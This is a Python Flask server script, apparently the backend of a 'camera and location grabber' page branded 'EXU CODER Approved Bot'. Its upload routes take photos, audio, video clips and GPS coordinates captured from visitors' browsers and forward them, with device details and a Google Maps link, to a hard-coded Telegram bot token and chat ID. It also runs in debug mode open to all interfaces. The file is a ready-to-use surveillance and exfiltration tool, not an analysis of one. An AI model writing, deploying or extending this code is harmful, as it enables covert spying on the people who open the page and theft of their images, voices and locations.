from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_cors import CORS
import base64
import requests
from datetime import datetime
import logging
import io
import os
import socket
import platform
from PIL import Image

app = Flask(__name__)
CORS(app)

# ─── TELEGRAM CONFIG ────────────────────────────────────────────
# ⚠️ REPLACE WITH YOUR ACTUAL CREDENTIALS
BOT_TOKEN = "8858703154:AAFnONjnnu6KDLdfNCZPRvDsz5B8KUMcaXs"
CHAT_ID = "8379062893"

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
SEND_PHOTO_URL = f"{TELEGRAM_API}/sendPhoto"
SEND_AUDIO_URL = f"{TELEGRAM_API}/sendAudio"
SEND_VIDEO_URL = f"{TELEGRAM_API}/sendVideo"
SEND_MESSAGE_URL = f"{TELEGRAM_API}/sendMessage"
SEND_LOCATION_URL = f"{TELEGRAM_API}/sendLocation"

# ─── LOGGING ─────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── GET DEVICE INFO ─────────────────────────────────────────────
def get_device_info():
    """Get device name and IP address"""
    try:
        device_name = platform.node() or "Unknown Device"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return device_name, ip_address
    except:
        return "Unknown Device", "0.0.0.0"

# ─── CONVERT TO BOLD UNICODE ────────────────────────────────────
def to_bold_unicode(text):
    """Convert text to bold Unicode characters"""
    result = []
    for char in text:
        code = ord(char)
        if 65 <= code <= 90:  # A-Z
            result.append(chr(0x1D400 + (code - 65)))
        elif 97 <= code <= 122:  # a-z
            result.append(chr(0x1D41A + (code - 97)))
        elif 48 <= code <= 57:  # 0-9
            result.append(chr(0x1D7CE + (code - 48)))
        else:
            result.append(char)
    return ''.join(result)

# ─── ROUTE: Serve HTML from same directory ──────────────────────
@app.route("/")
def index():
    html_path = os.path.join(os.path.dirname(__file__), "index.html")
    try:
        with open(html_path, "r", encoding="utf-8") as f:
            html_content = f.read()
        return render_template_string(html_content)
    except FileNotFoundError:
        return "❌ index.html not found in the current directory!", 404

@app.route("/<path:filename>")
def serve_static(filename):
    return send_from_directory(os.path.dirname(__file__), filename)

# ─── TELEGRAM SEND FUNCTIONS ────────────────────────────────────
def send_photo_to_telegram(image_bytes, device_name, ip_address):
    try:
        files = {"photo": ("photo.jpg", image_bytes, "image/jpeg")}
        
        bold_device = to_bold_unicode(device_name)
        bold_ip = to_bold_unicode(ip_address)
        bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        
        caption = f"""📸 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

🔹 𝐏𝐡𝐨𝐭𝐨 𝐂𝐚𝐩𝐭𝐮𝐫𝐞𝐝"""
        
        data = {"chat_id": CHAT_ID, "caption": caption}
        response = requests.post(SEND_PHOTO_URL, files=files, data=data)
        if response.status_code == 200:
            logger.info("✅ Photo sent to Telegram")
            return True
        logger.error(f"❌ Telegram error: {response.text}")
        return False
    except Exception as e:
        logger.error(f"❌ Error: {str(e)}")
        return False

def send_audio_to_telegram(audio_bytes, device_name, ip_address):
    try:
        files = {"audio": ("audio.webm", audio_bytes, "audio/webm")}
        
        bold_device = to_bold_unicode(device_name)
        bold_ip = to_bold_unicode(ip_address)
        bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        
        caption = f"""🎤 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

🔹 𝐀𝐮𝐝𝐢𝐨 𝐑𝐞𝐜𝐨𝐫𝐝𝐢𝐧𝐠"""
        
        data = {"chat_id": CHAT_ID, "caption": caption}
        response = requests.post(SEND_AUDIO_URL, files=files, data=data)
        if response.status_code == 200:
            logger.info("✅ Audio sent to Telegram")
            return True
        logger.error(f"❌ Telegram error: {response.text}")
        return False
    except Exception as e:
        logger.error(f"❌ Error: {str(e)}")
        return False

def send_video_to_telegram(video_bytes, device_name, ip_address):
    try:
        files = {"video": ("video.webm", video_bytes, "video/webm")}
        
        bold_device = to_bold_unicode(device_name)
        bold_ip = to_bold_unicode(ip_address)
        bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        
        caption = f"""🎥 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

🔹 𝐕𝐢𝐝𝐞𝐨 𝐂𝐥𝐢𝐩 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝"""
        
        data = {"chat_id": CHAT_ID, "caption": caption}
        response = requests.post(SEND_VIDEO_URL, files=files, data=data)
        if response.status_code == 200:
            logger.info("✅ Video sent to Telegram")
            return True
        logger.error(f"❌ Telegram error: {response.text}")
        return False
    except Exception as e:
        logger.error(f"❌ Error: {str(e)}")
        return False

def send_location_to_telegram(lat, lon, device_name, ip_address, accuracy):
    try:
        data = {"chat_id": CHAT_ID, "latitude": lat, "longitude": lon}
        response = requests.post(SEND_LOCATION_URL, data=data)
        
        if response.status_code == 200:
            bold_device = to_bold_unicode(device_name)
            bold_ip = to_bold_unicode(ip_address)
            bold_time = to_bold_unicode(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            
            message = f"""📍 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭

⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {bold_device}
🌐 𝐈𝐏: {bold_ip}
🕐 𝐓𝐢𝐦𝐞: {bold_time}

📌 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧:
🌍 𝐋𝐚𝐭𝐢𝐭𝐮𝐝𝐞: {lat}
🌍 𝐋𝐨𝐧𝐠𝐢𝐭𝐮𝐝𝐞: {lon}
🎯 𝐀𝐜𝐜𝐮𝐫𝐚𝐜𝐲: ~{accuracy}m

🔗 <a href="https://www.google.com/maps?q={lat},{lon}">📍 𝐎𝐩𝐞𝐧 𝐢𝐧 𝐌𝐚𝐩𝐬</a>"""
            send_message_to_telegram(message)
            logger.info(f"✅ Location sent: {lat}, {lon}")
            return True
        logger.error(f"❌ Telegram error: {response.text}")
        return False
    except Exception as e:
        logger.error(f"❌ Error: {str(e)}")
        return False

def send_message_to_telegram(message):
    try:
        data = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
        response = requests.post(SEND_MESSAGE_URL, data=data)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"❌ Error: {str(e)}")
        return False

# ─── UPLOAD ROUTES ──────────────────────────────────────────────
@app.route("/upload/photo", methods=["POST"])
def upload_photo():
    try:
        data = request.get_json()
        image_data = data.get("image")
        if not image_data:
            return jsonify({"success": False, "error": "No image"}), 400

        if image_data.startswith("data:image"):
            image_data = image_data.split(",")[1]

        image_bytes = base64.b64decode(image_data)
        image = Image.open(io.BytesIO(image_bytes))
        output = io.BytesIO()
        image.save(output, format='JPEG', quality=85, optimize=True)
        compressed = output.getvalue()

        device_name, ip_address = get_device_info()
        success = send_photo_to_telegram(compressed, device_name, ip_address)

        return jsonify({"success": success})
    except Exception as e:
        logger.error(f"❌ Photo error: {str(e)}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/upload/audio", methods=["POST"])
def upload_audio():
    try:
        data = request.get_json()
        audio_data = data.get("audio")
        if not audio_data:
            return jsonify({"success": False, "error": "No audio"}), 400

        if audio_data.startswith("data:audio"):
            audio_data = audio_data.split(",")[1]

        audio_bytes = base64.b64decode(audio_data)
        device_name, ip_address = get_device_info()
        success = send_audio_to_telegram(audio_bytes, device_name, ip_address)

        return jsonify({"success": success})
    except Exception as e:
        logger.error(f"❌ Audio error: {str(e)}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/upload/video", methods=["POST"])
def upload_video():
    try:
        data = request.get_json()
        video_data = data.get("video")
        if not video_data:
            return jsonify({"success": False, "error": "No video"}), 400

        if video_data.startswith("data:video"):
            video_data = video_data.split(",")[1]

        video_bytes = base64.b64decode(video_data)
        device_name, ip_address = get_device_info()
        success = send_video_to_telegram(video_bytes, device_name, ip_address)

        return jsonify({"success": success})
    except Exception as e:
        logger.error(f"❌ Video error: {str(e)}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/upload/location", methods=["POST"])
def upload_location():
    try:
        data = request.get_json()
        location = data.get("location")
        if not location:
            return jsonify({"success": False, "error": "No location"}), 400

        lat = location.get("latitude")
        lon = location.get("longitude")
        acc = location.get("accuracy", 0)
        
        if lat is None or lon is None:
            return jsonify({"success": False, "error": "Invalid location"}), 400

        device_name, ip_address = get_device_info()
        success = send_location_to_telegram(lat, lon, device_name, ip_address, acc)

        return jsonify({"success": success})
    except Exception as e:
        logger.error(f"❌ Location error: {str(e)}")
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == "__main__":
    device_name, ip_address = get_device_info()
    print("=" * 60)
    print("🌊 𝐄𝐗𝐔 𝐂𝐎𝐃𝐄𝐑 ─𑁍┊𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐁𝐨𝐭")
    print("=" * 60)
    print(f"⚡ 𝐃𝐞𝐯𝐢𝐜𝐞: {device_name}")
    print(f"🌐 𝐈𝐏: {ip_address}")
    print(f"📁 𝐃𝐢𝐫𝐞𝐜𝐭𝐨𝐫𝐲: {os.path.dirname(__file__)}")
    print("📄 𝐋𝐨𝐨𝐤𝐢𝐧𝐠 𝐟𝐨𝐫: index.html")
    print("🚀 𝐒𝐞𝐫𝐯𝐞𝐫: http://localhost:5000")
    print("📤 𝐅𝐨𝐫𝐰𝐚𝐫𝐝𝐢𝐧𝐠 𝐭𝐨 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦")
    print("📸 𝐏𝐡𝐨𝐭𝐨 + 🎤 𝐀𝐮𝐝𝐢𝐨 + 🎥 𝐕𝐢𝐝𝐞𝐨 + 📍 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧")
    print("=" * 60)
    app.run(debug=True, host="0.0.0.0", port=5000)
